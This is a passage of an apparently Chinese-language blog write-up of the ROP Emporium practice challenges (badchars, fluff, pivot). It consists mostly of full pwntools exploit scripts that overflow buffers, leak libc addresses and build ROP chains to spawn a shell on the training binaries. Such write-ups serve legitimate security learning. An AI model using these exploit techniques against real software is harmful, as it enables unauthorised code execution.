0x%x&quot;</span> % puts_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&#x27;</span></span><br><span class="line">pay += p64(pop_rdi_ret)</span><br><span class="line">pay += p64(binsh_addr)</span><br><span class="line">pay += p64(system_plt)</span><br><span class="line">pay += <span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()%</span><br></pre></td></tr></table></figure><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>æ£€æŸ¥ä¸€å®šçš„å­—ç¬¦ä¸èƒ½ç”¨ï¼Œå¹¶æ²¡æœ‰å¤šå¤§çš„å½±å“</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:11:53]</span></span><br><span class="line">$ cat ../badchars32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">badchrs = [<span class="string">&#x27;0x62&#x27;</span>,<span class="string">&#x27;0x69&#x27;</span>,<span class="string">&#x27;0x63&#x27;</span>,<span class="string">&#x27;0x2f&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>,<span class="string">&#x27;0x66&#x27;</span>,<span class="string">&#x27;0x6e&#x27;</span>,<span class="string">&#x27;0x73&#x27;</span>]</span><br><span class="line">log.info(badchrs)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80486B6</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;break *0x0804878F&#x27;&#x27;&#x27;)</span></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay +=<span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> payload:</span><br><span class="line">    payload.write(pay)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&quot;bad&quot;</span>)[<span class="number">9</span>:<span class="number">13</span>])</span><br><span class="line">system_addr = (printf_addr - printf_offset) + system_offset</span><br><span class="line">binsh_addr = (printf_addr - printf_offset) + binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_addr: 0x%x&quot;</span> % printf_addr)</span><br><span class="line">log.info(<span class="string">&quot;system_addr : 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr : 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        break *0x8048869</span></span><br><span class="line"><span class="string">        break *0x804878F</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay +=<span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay +=p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">pay +=p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>emmm è¿™ä¸ª çº¯ç²¹è°ƒç”¨gadgetå®Œæˆçš„ä»»åŠ¡</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:14:52] C:1</span></span><br><span class="line">$ cat ../fluff32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, time, struct, binascii</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span>():</span></span><br><span class="line">  HEADER = <span class="string">&#x27;\033[95m&#x27;</span></span><br><span class="line">  OKBLUE = <span class="string">&#x27;\033[94m&#x27;</span></span><br><span class="line">  OKGREEN = <span class="string">&#x27;\033[92m&#x27;</span></span><br><span class="line">  WARNING = <span class="string">&#x27;\033[93m&#x27;</span></span><br><span class="line">  FAIL = <span class="string">&#x27;\033[91m&#x27;</span></span><br><span class="line">  ENDC = <span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line">  BOLD = <span class="string">&#x27;\033[1m&#x27;</span></span><br><span class="line">  UNDERLINE = <span class="string">&#x27;\033[4m&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ip=None, port=None, length=<span class="number">0xFFFF</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip <span class="keyword">or</span> <span class="keyword">not</span> port:</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    self.socket.connect((ip, port))</span><br><span class="line">    self.length = length</span><br><span class="line">    self.rop = <span class="literal">None</span></span><br><span class="line">    self.receive = <span class="literal">None</span></span><br><span class="line">    self.log(<span class="string">&#x27;Connected to target&#x27;</span>)</span><br><span class="line">    self.line = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">iprocess</span>(<span class="params">elf</span>):</span></span><br><span class="line">  io = process(elf)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, payload=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload <span class="keyword">and</span> self.rop:</span><br><span class="line">      payload = self.rop</span><br><span class="line">    <span class="keyword">if</span> self.line:</span><br><span class="line">      payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">      self.line = <span class="literal">False</span></span><br><span class="line">    self.socket.send(payload)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sendline</span>(<span class="params">self, payload=None</span>):</span></span><br><span class="line">    self.line = <span class="literal">True</span></span><br><span class="line">    self.send(payload)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, l=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> l:</span><br><span class="line">      l = self.length</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.receive = self.socket.recv(l)</span><br><span class="line">    <span class="keyword">return</span> self.receive</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">create_rop</span>(<span class="params">self, offset, gadgets</span>):</span></span><br><span class="line">      p = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">      self.log(<span class="string">&#x27;Creating ROP Chain&#x27;</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="keyword">if</span> isinstance(gadget, (int, long)) <span class="keyword">and</span> hex(gadget).startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">          p += self.p(gadget)</span><br><span class="line">          <span class="keyword">print</span> <span class="string">&#x27;    &#x27;</span>,hex(gadget)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          p += gadget</span><br><span class="line">          <span class="keyword">print</span> <span class="string">&#x27;    &#x27;</span>,gadget</span><br><span class="line">      self.rop = p</span><br><span class="line">      <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">recv_until</span>(<span class="params">self, string</span>):</span></span><br><span class="line">    buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      x = self.socket.recv(<span class="number">1024</span>)</span><br><span class="line">      buff += x</span><br><span class="line">      <span class="keyword">if</span> x.strip() == string:</span><br><span class="line">        <span class="keyword">return</span> buff</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">self, a, t=None</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t:</span><br><span class="line">      t = self.OKBLUE + <span class="string">&#x27;+&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">      t = self.HEADER + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      t = self.WARNING + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">      t = self.FAIL + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    t  =  self.OKGREEN + <span class="string">&#x27;[&#x27;</span> + t + self.OKGREEN + <span class="string">&#x27;]&#x27;</span> + self.ENDC</span><br><span class="line">    print(t + <span class="string">&#x27; %s&#x27;</span> % (a))</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">funcs</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">    raw = raw.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    t_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> raw:</span><br><span class="line">      f = f.split()</span><br><span class="line">      f_name = f[<span class="number">1</span>].replace(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">      f_addr = f[<span class="number">0</span>]</span><br><span class="line">      t_dict[f_name] = int(f_addr, <span class="number">16</span>)</span><br><span class="line">      globals()[f_name] = int(f_addr,<span class="number">16</span>)</span><br><span class="line">    self.functions = t_dict</span><br><span class="line">    <span class="keyword">return</span> self.functions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">p</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;pack raw packets&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">u</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;unpack raw packets&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;L&#x27;</span>, addr)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">hexdump</span>(<span class="params">self, data=None, bytez=<span class="number">0</span></span>):</span></span><br><span class="line">    info_msg = <span class="string">&quot;\t\t-------&gt;Hex Dump&lt;-------&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">      data = self.recv()</span><br><span class="line">      info_msg = <span class="string">&#x27;Hex Dump for last receive\n&#x27;</span></span><br><span class="line">    self.log(info_msg)</span><br><span class="line">    ndata = binascii.hexlify(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n&quot;</span></span><br><span class="line">    ndata = list(self.chunks(ndata[:<span class="number">320</span>],<span class="number">32</span>))</span><br><span class="line">    offset = bytez</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> ndata:</span><br><span class="line">      x = <span class="string">&#x27; &#x27;</span>.join(each[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(each), <span class="number">2</span>))</span><br><span class="line">      printspace = <span class="string">&quot; &quot;</span>*(<span class="number">10</span>-len(hex(offset)))</span><br><span class="line">      <span class="keyword">print</span> hex(offset) + printspace + x</span><br><span class="line">      offset += <span class="number">16</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">self, l, n</span>):</span></span><br><span class="line">    n = max(<span class="number">1</span>, n)</span><br><span class="line">    <span class="keyword">return</span> (l[i:i+n] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n))</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">interactive</span>(<span class="params">self, tty=None</span>):</span></span><br><span class="line">    telnet = telnetlib.Telnet()</span><br><span class="line">    telnet.sock = self.socket</span><br><span class="line">    self.log(<span class="string">&#x27;Switching to interactive session\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> tty:</span><br><span class="line">      telnet.write(<span class="string">&#x27;python -c &quot;import pty;pty.spawn(\&#x27;/bin/sh\&#x27;)&quot;\n&#x27;</span>)</span><br><span class="line">    telnet.interact()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">write_payload</span>(<span class="params">self, file_name=None, payload=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">      file_name = <span class="string">&#x27;payload&#x27;</span></span><br><span class="line">    self.log(<span class="string">&#x27;Writing payload to file : &#x27;</span> + file_name)</span><br><span class="line">    f = open(file_name, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">addresses = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x08048400  printf@plt</span></span><br><span class="line"><span class="string">0x08048410  fgets@plt</span></span><br><span class="line"><span class="string">0x08048420  puts@plt</span></span><br><span class="line"><span class="string">0x08048430  system@plt</span></span><br><span class="line"><span class="string">0x0804857b  main</span></span><br><span class="line"><span class="string">0x080485f6  pwnme</span></span><br><span class="line"><span class="string">0x0804864c  usefulFunction</span></span><br><span class="line"><span class="string">0x08048670  questionableGadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">xor_edx_edx   = <span class="number">0x8048671</span></span><br><span class="line">pop_ebx       = <span class="number">0x8048696</span></span><br><span class="line">xor_edx_ebx   = <span class="number">0x804867b</span></span><br><span class="line">xchg_edx_ecx  = <span class="number">0x8048689</span></span><br><span class="line">mov_ecx_edx   = <span class="number">0x8048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer_x      = <span class="number">0x804a028</span></span><br><span class="line"></span><br><span class="line">PADDING_4     = <span class="string">&#x27;P&#x27;</span>*<span class="number">4</span></span><br><span class="line">PADDING_8     = <span class="string">&#x27;P&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BIN   = <span class="string">&#x27;\x53bin&#x27;</span></span><br><span class="line">SH    = <span class="string">&#x27;\x7fsh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = Target(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#target = process(&quot;./fluff32&quot;)</span></span><br><span class="line">target.funcs(addresses)</span><br><span class="line">target.create_rop(<span class="number">44</span>, [ xor_edx_edx, PADDING_4, pop_ebx, buffer_x, xor_edx_ebx, PADDING_4, xchg_edx_ecx,</span><br><span class="line">                        PADDING_4, xor_edx_edx, PADDING_4, pop_ebx, BIN, xor_edx_ebx, PADDING_4, mov_ecx_edx, PADDING_8,</span><br><span class="line">                        xor_edx_edx, PADDING_4, pop_ebx, buffer_x+<span class="number">4</span>, xor_edx_ebx, PADDING_4, xchg_edx_ecx,</span><br><span class="line">                        PADDING_4, xor_edx_edx, PADDING_4, pop_ebx, SH, xor_edx_ebx, PADDING_4, mov_ecx_edx, PADDING_8,</span><br><span class="line">                        system_plt, PADDING_4, buffer_x])</span><br><span class="line">target.log(<span class="string">&#x27;Sending ROP Chain&#x27;</span>)</span><br><span class="line">target.sendline()</span><br><span class="line">target.recv()</span><br><span class="line">target.interactive(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>è¿™é‡Œçš„é—®é¢˜æ˜¯å †æ ˆä¸Šå¯ç”¨çš„ç©ºé—´å¾ˆå°ï¼Œæˆ‘ä»¬åœ¨è¿”å›æŒ‡é’ˆååªæœ‰13bytesåˆ†é…ç»™å †æ ˆã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•æ¥åˆ°æ›´å¤šçš„ç©ºé—´ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œç”±äºASLRï¼Œæˆ‘ä»¬ä¸èƒ½åªä½¿ç”¨å †æ ˆåœ°å€æ¥å®ç°ï¼Œè€Œæ²¡æœ‰ä»»ä½•å†…å­˜æ³„æ¼ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½è¦†ç›–äº†EBP  ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ç»™å‡ºäº†ä¸€äº›åœ°å€å€¼ã€‚é¦–å…ˆè®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æ‰€æœ‰çš„AAAAçš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç¡®è®¤ æˆ‘çš„ç¬¬ä¸€æ¬¡è¾“å…¥çš„åœ°å€ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€æ¬¡ è¦†ç›–ebpï¼Œç„¶åè¿”å›åˆ°æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥çš„åœ°æ–¹ï¼Œå»get flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/pivot32 [15:16:18]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x804889e</span></span><br><span class="line">leakaddr  = int(io.recv().split()[<span class="number">20</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leakaddr: 0x%x&quot;</span> % leakaddr)</span><br><span class="line">base_addr = leakaddr + <span class="number">0x1d90f8</span>         <span class="comment"># 0xb7fd1000 - 0xb7df7f08 = 0x1d90f8  (0xf7df7000 - 0xf7df5f08)</span></span><br><span class="line">ret_win_addr = base_addr + <span class="number">0x967</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;base addr:0x%x&quot;</span> % base_addr)</span><br><span class="line">log.info(<span class="string">&quot;ret_win_addr: 0x%x&quot;</span> % ret_win_addr)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += p32(foothold_function_plt)</span><br><span class="line">pay += p32(ret_win_addr)</span><br><span class="line"></span><br><span 